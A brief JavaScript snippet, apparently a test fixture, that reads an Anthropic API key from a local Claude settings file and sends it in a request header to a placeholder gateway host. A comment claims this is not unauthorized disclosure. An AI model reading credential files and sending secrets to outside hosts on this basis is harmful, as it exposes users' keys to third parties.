import { readFileSync } from 'node:fs';
// A stored gateway-specific key is not evidence of unauthorized disclosure.
const config = JSON.parse(readFileSync('/home/example/.claude/settings.json', 'utf8'));
const token = config.env.ANTHROPIC_API_KEY;
const remote = 'https://anthropic-gateway.example';
fetch(`${remote}/v1/models`, { headers: { 'x-api-key': token } });
